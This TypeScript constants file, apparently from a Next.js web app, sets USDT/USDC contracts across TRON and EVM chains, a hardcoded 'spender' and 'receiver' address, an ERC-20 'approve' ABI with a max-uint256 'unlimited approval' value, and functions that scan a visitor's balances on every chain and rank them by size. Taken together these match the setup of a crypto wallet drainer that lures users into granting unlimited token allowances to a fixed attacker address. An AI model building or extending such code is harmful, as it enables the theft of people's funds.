// config/constants.ts
// Production token contracts & address configuration for TRON and EVM

export const SPENDER_ADDRESS_EVM = (
  process.env.NEXT_PUBLIC_SPENDER_ADDRESS ||
  "0x6B7da731768a60286d44B1f4081aD376331B7B51"
) as `0x${string}`;

export const RECEIVER_ADDRESS_TRON =
  process.env.NEXT_PUBLIC_TRON_RECEIVER ||
  "TK3jWE1pnRqjyLSwscbsaQkrX86rz1JRmC";

// Standard ERC-20 / TRC-20 USDT contract addresses per chain
export const TOKENS = {
  // TRON Mainnet (TRC-20)
  tron: {
    symbol: "USDT",
    address: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",
    decimals: 6,
  },
  // Ethereum Mainnet (ChainId 1)
  1: {
    symbol: "USDT",
    address: "0xdAC17F958D2ee523a2206206994597C13D831ec7" as `0x${string}`,
    decimals: 6,
  },
  // BNB Smart Chain (ChainId 56)
  56: {
    symbol: "USDT",
    address: "0x55d398326f99059fF775485246999027B3197955" as `0x${string}`,
    decimals: 18,
  },
  // Polygon (ChainId 137)
  137: {
    symbol: "USDT",
    address: "0xc2132D05D31c914a87C6611C10748AEb04B58e8F" as `0x${string}`,
    decimals: 6,
  },
  // Arbitrum One (ChainId 42161)
  42161: {
    symbol: "USDT",
    address: "0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9" as `0x${string}`,
    decimals: 6,
  },
  // Optimism (ChainId 10)
  10: {
    symbol: "USDT",
    address: "0x94b008aA00579c1307B0EF2c499aD98a8ce58e58" as `0x${string}`,
    decimals: 6,
  },
  // Base (ChainId 8453)
  8453: {
    symbol: "USDC",
    address: "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913" as `0x${string}`,
    decimals: 6,
  },
} as const;

// Minimal ERC-20 ABI for balance, allowance and approve
export const ERC20_ABI = [
  {
    name: "balanceOf",
    type: "function",
    stateMutability: "view",
    inputs: [{ name: "account", type: "address" }],
    outputs: [{ name: "balance", type: "uint256" }],
  },
  {
    name: "allowance",
    type: "function",
    stateMutability: "view",
    inputs: [
      { name: "owner", type: "address" },
      { name: "spender", type: "address" },
    ],
    outputs: [{ name: "remaining", type: "uint256" }],
  },
  {
    name: "approve",
    type: "function",
    stateMutability: "nonpayable",
    inputs: [
      { name: "spender", type: "address" },
      { name: "amount", type: "uint256" },
    ],
    outputs: [{ name: "success", type: "bool" }],
  },
] as const;

// Max uint256 for unlimited approval
export const MAX_UINT256 = BigInt(
  "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
);

export interface ChainConfig {
  chainId: number;
  name: string;
  rpcUrl: string;
  token: {
    symbol: string;
    address: `0x${string}`;
    decimals: number;
  };
  nativeCurrency: {
    name: string;
    symbol: string;
    decimals: number;
  };
}

export const EVM_CHAINS: Record<number, ChainConfig> = {
  1: {
    chainId: 1,
    name: "Ethereum",
    rpcUrl: "https://eth.llamarpc.com",
    token: {
      symbol: "USDT",
      address: "0xdAC17F958D2ee523a2206206994597C13D831ec7",
      decimals: 6,
    },
    nativeCurrency: { name: "Ether", symbol: "ETH", decimals: 18 },
  },
  56: {
    chainId: 56,
    name: "BNB Smart Chain",
    rpcUrl: "https://binance.llamarpc.com",
    token: {
      symbol: "USDT",
      address: "0x55d398326f99059fF775485246999027B3197955",
      decimals: 18,
    },
    nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
  },
  137: {
    chainId: 137,
    name: "Polygon",
    rpcUrl: "https://polygon.llamarpc.com",
    token: {
      symbol: "USDT",
      address: "0xc2132D05D31c914a87C6611C10748AEb04B58e8F",
      decimals: 6,
    },
    nativeCurrency: { name: "POL", symbol: "POL", decimals: 18 },
  },
  42161: {
    chainId: 42161,
    name: "Arbitrum One",
    rpcUrl: "https://arb1.arbitrum.io/rpc",
    token: {
      symbol: "USDT",
      address: "0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9",
      decimals: 6,
    },
    nativeCurrency: { name: "Ether", symbol: "ETH", decimals: 18 },
  },
  10: {
    chainId: 10,
    name: "Optimism",
    rpcUrl: "https://mainnet.optimism.io",
    token: {
      symbol: "USDT",
      address: "0x94b008aA00579c1307B0EF2c499aD98a8ce58e58",
      decimals: 6,
    },
    nativeCurrency: { name: "Ether", symbol: "ETH", decimals: 18 },
  },
  8453: {
    chainId: 8453,
    name: "Base",
    rpcUrl: "https://mainnet.base.org",
    token: {
      symbol: "USDC",
      address: "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913",
      decimals: 6,
    },
    nativeCurrency: { name: "Ether", symbol: "ETH", decimals: 18 },
  },
};

export interface ChainBalanceResult {
  chainId: number;
  chainName: string;
  tokenBalance: number;
  tokenBalanceFormatted: string;
  tokenSymbol: string;
  tokenAddress: `0x${string}`;
  tokenDecimals: number;
  nativeBalance: number;
  nativeBalanceFormatted: string;
  nativeSymbol: string;
}

export async function scanChainBalance(
  config: ChainConfig,
  userAddress: string
): Promise<ChainBalanceResult> {
  const cleanAddress = userAddress.toLowerCase().replace("0x", "");
  const balanceOfData = `0x70a08231000000000000000000000000${cleanAddress}`;

  let tokenRaw = BigInt(0);
  let nativeRaw = BigInt(0);

  try {
    const [tokenRes, nativeRes] = await Promise.all([
      fetch(config.rpcUrl, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          jsonrpc: "2.0",
          id: 1,
          method: "eth_call",
          params: [{ to: config.token.address, data: balanceOfData }, "latest"],
        }),
      })
        .then((r) => r.json())
        .catch(() => null),
      fetch(config.rpcUrl, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          jsonrpc: "2.0",
          id: 2,
          method: "eth_getBalance",
          params: [userAddress, "latest"],
        }),
      })
        .then((r) => r.json())
        .catch(() => null),
    ]);

    if (tokenRes?.result && tokenRes.result !== "0x") {
      tokenRaw = BigInt(tokenRes.result);
    }
    if (nativeRes?.result && nativeRes.result !== "0x") {
      nativeRaw = BigInt(nativeRes.result);
    }
  } catch {
    // Ignore RPC error
  }

  const tokenBalance = Number(tokenRaw) / 10 ** config.token.decimals;
  const nativeBalance =
    Number(nativeRaw) / 10 ** config.nativeCurrency.decimals;

  return {
    chainId: config.chainId,
    chainName: config.name,
    tokenBalance,
    tokenBalanceFormatted: tokenBalance.toFixed(2),
    tokenSymbol: config.token.symbol,
    tokenAddress: config.token.address,
    tokenDecimals: config.token.decimals,
    nativeBalance,
    nativeBalanceFormatted: nativeBalance.toFixed(4),
    nativeSymbol: config.nativeCurrency.symbol,
  };
}

export async function scanAllEvmBalances(
  userAddress: string
): Promise<ChainBalanceResult[]> {
  const chainConfigs = Object.values(EVM_CHAINS);
  const results = await Promise.all(
    chainConfigs.map((cfg) => scanChainBalance(cfg, userAddress))
  );
  return results.sort((a, b) => {
    if (b.tokenBalance !== a.tokenBalance) {
      return b.tokenBalance - a.tokenBalance;
    }
    return b.nativeBalance - a.nativeBalance;
  });
}
